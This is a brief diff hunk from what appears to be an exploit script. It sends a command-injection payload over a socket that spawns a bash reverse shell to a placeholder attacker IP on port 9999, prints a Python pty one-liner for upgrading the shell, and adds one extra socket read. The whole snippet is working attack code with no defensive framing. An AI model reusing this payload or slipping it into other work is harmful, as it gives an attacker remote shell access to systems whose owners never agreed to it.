@@ -17,3 +17,4 @@ report_text = "; bash -i >& /dev/tcp/<<IPADDRESS>>/9999 0>&1 #\n\r"
 s.send(report_text.encode())
 print("Dont close until you have a stable shell\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
 s.recv(1024).decode()
+s.recv(1024).decode()
